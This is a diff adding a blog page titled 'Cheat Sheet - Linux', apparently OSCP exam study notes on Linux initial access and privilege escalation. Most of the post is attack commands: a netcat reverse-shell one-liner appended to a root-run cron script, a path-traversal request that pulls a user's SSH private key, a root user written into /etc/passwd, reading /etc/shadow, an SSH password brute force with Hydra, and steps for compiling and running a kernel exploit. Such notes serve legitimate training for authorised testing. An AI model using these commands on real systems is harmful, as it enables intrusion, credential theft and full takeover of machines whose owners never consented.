@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Cheat Sheet - Linux :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content=" Initial Access Launch Netcat Listener: nc -nvlp 1234 Launch HTML server: `python3 -m http.server 80 Launch Python Virtual Environment:
+cd ~/py `python3 -m venv venv source bin/activate Run enum4linux-ng: enum4linux-ng -A 192.168.x.xRun enum4linux:enum4linux 192.168.x.x` (Run both tools) PrivEsc Upgrade Shell `/usr/bin/script -qc /bin/bash /dev/null `python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo; `python3 -c &ldquo;import pty; pty.spawn(&rsquo;/bin/sh&rsquo;)&rdquo; /bin/sh -i | /bin/bash -i | echo &#39;os.system(&#39;/bin/bash&#39;)&#39; perl -e &#39;exec &quot;/bin/sh&quot;;&#39; To escape rbash ssh user@ip -t &quot;bash --noprofile&quot; export PATH=$PATH:/usr/local/sbin:/usr/localsbin:/usr/sbin:/usr/bin:/sbin:/bin Enumerate find / -name local.txt -type f 2&gt;/dev/null id cat /etc/passwd | cat /etc/shadow | cat /root/.ssh hostname, cat /etc/issue,cat /etc/os-release, uname -a /home/andrew/.bash_history sudo -l &ndash;&gt; check GTFOBins crontab -l su root:root, su andrew:andrew, su andrew:(NOPASS), sudo -i (reqs root password) ls /var/mail | ls /var/spool/mail /usr/sbin/getcap -r / 2&gt;/dev/null If member of Disk Group df -h (find OS) | debugfs /dva/OS | /etc/shadow /root/.ssh Binaries find / -perm -4000 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null -printf &quot;%f\n&quot; ls -lah &amp; check GTFObins Processes: ps -eaf Watch processes:watch -n 1 &quot;ps -aux | grep pass&quot; Pspy: https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 wget $kaliIP/pspy32 chmod &#43;x pspy32 &amp; timeout 2m ./pspy32 If root is regularly running a writable script: echo &quot;chmod &#43;s /bin/bash&quot; &gt;&gt; script.sh then /bin/bash -p Enumeration Scripts: SUIDer: wget -L https://github.com/etc5had0w/suider/blob/main/suider.sh LinPeas: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh LinEnum Kali Pre-installed unix-privesc-check Linux Exploit Suggester https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh Linux Smart Enumeration wget https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh Exploit RSA key on Linux server: curl http://192.168.XX.XXX/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/username/.ssh/id_rsa Random - To Sort exiftool -a -u file.pdf (metadata inspector)
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/cheat-sheet---oscp-linux/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Cheat Sheet - Linux">
+<meta property="og:description" content=" Initial Access Launch Netcat Listener: nc -nvlp 1234 Launch HTML server: `python3 -m http.server 80 Launch Python Virtual Environment:
+cd ~/py `python3 -m venv venv source bin/activate Run enum4linux-ng: enum4linux-ng -A 192.168.x.xRun enum4linux:enum4linux 192.168.x.x` (Run both tools) PrivEsc Upgrade Shell `/usr/bin/script -qc /bin/bash /dev/null `python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo; `python3 -c &ldquo;import pty; pty.spawn(&rsquo;/bin/sh&rsquo;)&rdquo; /bin/sh -i | /bin/bash -i | echo &#39;os.system(&#39;/bin/bash&#39;)&#39; perl -e &#39;exec &quot;/bin/sh&quot;;&#39; To escape rbash ssh user@ip -t &quot;bash --noprofile&quot; export PATH=$PATH:/usr/local/sbin:/usr/localsbin:/usr/sbin:/usr/bin:/sbin:/bin Enumerate find / -name local.txt -type f 2&gt;/dev/null id cat /etc/passwd | cat /etc/shadow | cat /root/.ssh hostname, cat /etc/issue,cat /etc/os-release, uname -a /home/andrew/.bash_history sudo -l &ndash;&gt; check GTFOBins crontab -l su root:root, su andrew:andrew, su andrew:(NOPASS), sudo -i (reqs root password) ls /var/mail | ls /var/spool/mail /usr/sbin/getcap -r / 2&gt;/dev/null If member of Disk Group df -h (find OS) | debugfs /dva/OS | /etc/shadow /root/.ssh Binaries find / -perm -4000 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null -printf &quot;%f\n&quot; ls -lah &amp; check GTFObins Processes: ps -eaf Watch processes:watch -n 1 &quot;ps -aux | grep pass&quot; Pspy: https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 wget $kaliIP/pspy32 chmod &#43;x pspy32 &amp; timeout 2m ./pspy32 If root is regularly running a writable script: echo &quot;chmod &#43;s /bin/bash&quot; &gt;&gt; script.sh then /bin/bash -p Enumeration Scripts: SUIDer: wget -L https://github.com/etc5had0w/suider/blob/main/suider.sh LinPeas: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh LinEnum Kali Pre-installed unix-privesc-check Linux Exploit Suggester https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh Linux Smart Enumeration wget https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh Exploit RSA key on Linux server: curl http://192.168.XX.XXX/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/username/.ssh/id_rsa Random - To Sort exiftool -a -u file.pdf (metadata inspector)
+" />
+<meta property="og:url" content="/posts/cheat-sheet---oscp-linux/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/cheat-sheet---oscp-linux/">Cheat Sheet - Linux</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+      #<a href="/tags/oscp/">oscp</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <hr>
+<h1 id="initial-access">Initial Access<a href="#initial-access" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Launch Netcat Listener: <code>nc -nvlp 1234</code>
+Launch HTML server: `python3 -m http.server 80
+Launch Python Virtual Environment:</p>
+<ul>
+<li><code>cd ~/py</code></li>
+<li>`python3 -m venv venv</li>
+<li><code>source bin/activate Run enum4linux-ng: </code>enum4linux-ng -A 192.168.x.x<code>Run enum4linux:</code>enum4linux 192.168.x.x` (Run both tools)</li>
+</ul>
+<h1 id="privesc">PrivEsc<a href="#privesc" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="upgrade-shell">Upgrade Shell<a href="#upgrade-shell" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>`/usr/bin/script -qc /bin/bash /dev/null</li>
+<li>`python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo;</li>
+<li>`python3 -c &ldquo;import pty; pty.spawn(&rsquo;/bin/sh&rsquo;)&rdquo;</li>
+<li><code>/bin/sh -i</code> | <code>/bin/bash -i</code> | <code>echo 'os.system('/bin/bash')'</code></li>
+<li><code>perl -e 'exec &quot;/bin/sh&quot;;'</code></li>
+<li>To escape rbash
+<ul>
+<li><code>ssh user@ip -t &quot;bash --noprofile&quot;</code></li>
+<li><code>export PATH=$PATH:/usr/local/sbin:/usr/localsbin:/usr/sbin:/usr/bin:/sbin:/bin</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="enumerate">Enumerate<a href="#enumerate" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><code>find / -name local.txt -type f 2&gt;/dev/null</code></li>
+<li><code>id</code></li>
+<li><code>cat /etc/passwd</code> | <code>cat /etc/shadow</code> | <code>cat /root/.ssh</code></li>
+<li><code>hostname</code>, <code>cat /etc/issue</code>,<code>cat /etc/os-release</code>, <code>uname -a</code></li>
+<li><code>/home/andrew/.bash_history</code></li>
+<li><code>sudo -l</code> &ndash;&gt; check <a href="https://gtfobins.github.io/">GTFOBins</a></li>
+<li><code>crontab -l</code></li>
+<li><code>su root:root</code>, <code>su andrew:andrew</code>, <code>su andrew:(NOPASS)</code>, <code>sudo -i</code> (reqs root password)</li>
+<li><code>ls /var/mail</code> | <code>ls /var/spool/mail</code></li>
+<li><code>/usr/sbin/getcap -r / 2&gt;/dev/null</code></li>
+<li><a href="https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989--------------------------------">If member of Disk Group</a>
+<ul>
+<li><code>df -h</code> (find OS) | <code>debugfs /dva/OS</code> | <code>/etc/shadow</code> <code>/root/.ssh</code></li>
+</ul>
+</li>
+<li>Binaries
+<ul>
+<li><code>find / -perm -4000 2&gt;/dev/null</code></li>
+<li><code>find / -perm -u=s -type f 2&gt;/dev/null -printf &quot;%f\n&quot;</code>
+<ul>
+<li><code>ls -lah</code> &amp; check <a href="https://gtfobins.github.io/">GTFObins</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Processes:
+<ul>
+<li><code>ps -eaf</code></li>
+<li>Watch processes:<code>watch -n 1 &quot;ps -aux | grep pass&quot;</code></li>
+<li>Pspy: <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32">https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32</a>
+<ul>
+<li><code>wget $kaliIP/pspy32</code></li>
+<li><code>chmod +x pspy32</code> &amp; <code>timeout 2m ./pspy32</code></li>
+</ul>
+</li>
+<li>If root is regularly running a writable script: <code>echo &quot;chmod +s /bin/bash&quot; &gt;&gt; script.sh</code> then <code>/bin/bash -p</code></li>
+</ul>
+</li>
+<li>Enumeration Scripts:
+<ul>
+<li><a href="https://github.com/etc5had0w/suider/blob/main/suider.sh">SUIDer</a>: <code>wget -L https://github.com/etc5had0w/suider/blob/main/suider.sh</code></li>
+<li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPeas</a>: <code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></li>
+<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
+<li>Kali Pre-installed <code>unix-privesc-check</code></li>
+<li><a href="https://github.com/mzet-/linux-exploit-suggester">Linux Exploit Suggester</a> <code>https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh</code></li>
+<li><a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a> <code>wget https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="exploit">Exploit<a href="#exploit" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>RSA key on Linux server: <code>curl http://192.168.XX.XXX/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/username/.ssh/id_rsa</code></li>
+</ul>
+<h1 id="random---to-sort">Random - To Sort<a href="#random---to-sort" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>
+<p><code>exiftool -a -u file.pdf</code> (metadata inspector)</p>
+</li>
+<li></li>
+<li>
+<p>Linux -  <a href="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist">https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist</a></p>
+</li>
+<li>
+<p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a> (Comprehensive Cheat Sheet)</p>
+</li>
+<li>
+<p>DirtyPipe <a href="https://medium.com/@urshilaravindran/dirty-pipe-linux-local-privilege-escalation-cve-2022-0847-f16ec3c04ea4">https://medium.com/@urshilaravindran/dirty-pipe-linux-local-privilege-escalation-cve-2022-0847-f16ec3c04ea4</a></p>
+</li>
+<li>
+<p>PwnKit <a href="https://github.com/ly4k/PwnKit/tree/main">https://github.com/ly4k/PwnKit/tree/main</a> (POWERFUL)</p>
+</li>
+<li>
+<p>Wildcards with tar <a href="https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa">https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa</a></p>
+</li>
+</ul>
+<h2 id="manual-enumeration">Manual Enumeration<a href="#manual-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h2 id="systemuser-info">System/User Info<a href="#systemuser-info" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>List installed applications: <code>dpkg -l</code> (Debian) or <code>rpm</code> (RedHat)</li>
+<li>Find writable directories: <code>find / -writable -type d 2&gt;/dev/null</code></li>
+<li>Cron Jobs: <code>ls -lah /etc/cron*</code> &amp; <code>sudo crontab -l</code></li>
+<li>List drives mounted at boot: <code>cat /etc/fstab</code></li>
+<li>View all available disks: <code>lsblk</code></li>
+<li>List loaded kernel modules: <code>lsmod</code> (Inspect a Module: <code>/sbin/modinfo modulename</code>)</li>
+<li>Find permissions that can be set: <code>find / -perm -u=s -type f 2&gt;/dev/null</code>
+<ul>
+<li>Check binaries with <code>strings</code> (eg. <code>strings /usr/bin/passwd_flag</code>)</li>
+</ul>
+</li>
+<li>Net
+<ul>
+<li>Network interfaces: <code>ipconfig</code> or <code>ip a</code></li>
+<li>Routing Tables: <code>routel</code></li>
+<li>Network connections: <code>netstat</code> or <code>ss -anp</code></li>
+<li>Firewall Rules: <code>cat /etc/iptables/rules.v4</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="other-tools">Other Tools<a href="#other-tools" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a> (<a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">Script</a>)
+<ul>
+<li><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh &amp;&amp; chmod +x LinEnum.sh</code> (<code>./LinEnum.sh</code> to run)</li>
+</ul>
+</li>
+<li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPeas</a> (<a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20240908-e068962e">Releases</a>)
+<ul>
+<li><code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="inspecting-user-trails">Inspecting User Trails<a href="#inspecting-user-trails" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><code>env</code></li>
+<li><code>cat .bashrc</code></li>
+</ul>
+<p>Switch to root with credentials found: <code>su -root</code>
+Use <code>crunch</code> to generate custom wordlist for password bruteforce another user:</p>
+<ul>
+<li><code>crunch 6 6 -t Lab%%% &gt; wordlist</code></li>
+<li>Then use wordlist with Hydra: <code>hydra -l user -P wordlist 192.168.taregt.ip -t 4 ssh -V</code></li>
+</ul>
+<h2 id="inspecting-service-footprints">Inspecting Service Footprints<a href="#inspecting-service-footprints" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Look for &ldquo;pass&rdquo;</p>
+<ul>
+<li>Watch processes with 1 second refresh:<code>watch -n 1 &quot;ps -aux | grep pass&quot;</code></li>
+<li>Capture traffic via tcmpdump: <code>sudo tcpdump -i lo -A | grep &quot;pass&quot;</code></li>
+</ul>
+<h2 id="insecure-file-permissions">Insecure File Permissions<a href="#insecure-file-permissions" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="abusing-cron-jobs">Abusing Cron Jobs<a href="#abusing-cron-jobs" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Inspect cron log file: <code>grep &quot;CRON&quot; /var/log/syslog</code></p>
+<ul>
+<li>Look for scripts running regularly that you can modify
+Check permission: <code>ls -lah file/path/.scripts/target_script.sh </code>)</li>
+<li>Echo into the script a reverse-shell one-liner then wait for it to execute
+eg. <code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.attack.ip 4444 &gt;/tmp/f&quot; &gt;&gt; /file/path/target_script.sh</code></li>
+</ul>
+<h2 id="abusing-password-authentication">Abusing Password Authentication<a href="#abusing-password-authentication" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>If <code>/ect/passwd</code> is writable (<code>ls -lah /etc/passwd</code>)</p>
+<ul>
+<li>Generate a password hash (crypt algorithm): <code>openssl passwd pass123</code></li>
+<li>Echo new user &ldquo;root2&rdquo; into /etc/passwd: <code>echo &quot;root2:PaSsW0rdHashH3r3:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</code></li>
+<li>Switch to new root user: <code>su root2</code> &amp; enter <code>pass123</code></li>
+</ul>
+<h2 id="insecure-system-components">Insecure System Components<a href="#insecure-system-components" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Run password change for low-privilege user: <code>passwd</code></p>
+<ul>
+<li>In another tab, check the process ID: <code>ps u -C passwd</code></li>
+<li>Check process (UID=1932) is running as root: <code>grep Uid /proc/1932/status</code>
+<code>Uid: 1000    0    0    0</code> (Uid of &ldquo;zero&rdquo; means it&rsquo;s root)</li>
+<li>Check process for a Set-User-ID: <code>ls -asl /usr/bin/passwd</code>
+<code>-rwsr-xr-x 1 root root</code> (look for <code>s</code>)</li>
+</ul>
+<p>If we found <code>find</code> is misconfigured:</p>
+<ul>
+<li><code>find /home/joe/Desktop -exec &quot;/usr/bin/bash&quot; -p \;</code></li>
+</ul>
+<p>To search for misconfigured capabilities: <code>/usr/sbin/getcap -r / 2&gt;/dev/null</code>
+Look for options with <code>setuid+ep</code> (set UID is <em>effective</em> and <em>permitted</em>)</p>
+<h2 id="kernel-vulnerabilities">Kernel Vulnerabilities<a href="#kernel-vulnerabilities" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Always inspect the following;</p>
+<ul>
+<li>System information: <code>cat /etc/issue</code></li>
+<li>Kernel Version: <code>uname -r</code></li>
+<li>System architechture: <code>arch</code></li>
+</ul>
+<p>Use Searchsploit to look for kernel exploits: <code>searchsploit &quot;linux kernel Ubuntu 16 Local Privilege Escalation&quot;   | grep  &quot;4.&quot; | grep -v &quot; &lt; 4.4.0&quot; | grep -v &quot;4.8&quot;</code></p>
+<ul>
+<li>Copy exploit to current folder: <code>cp /usr/share/exploitdb/exploits/linux/local/45010.c .</code></li>
+<li>Check <code>head</code> for compilation instructions: <code>head 45010.c</code></li>
+<li>If exploit has GCC;
+<ul>
+<li>Just needs a rename: <code>mv 45010.c cve-2017-16995.c</code></li>
+<li>Transfer exploit to target via SCP: <code>scp cve-2017-16995.c joe@192.168.target.ip.:</code></li>
+<li>Connect &amp; run GCC to compile: <code>gcc cve-2017-16995.c -o cve-2017-16995</code></li>
+<li>Run exploit: <code>./cve-2017-16995</code></li>
+</ul>
+</li>
+</ul>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/cheat-sheet---cryptography/" class="button inline prev">
+        &lt; [<span class="button__text">Cheat Sheet - Cryptography</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/cheat-sheet---networking/" class="button inline next">
+         [<span class="button__text">Cheat Sheet - Networking</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
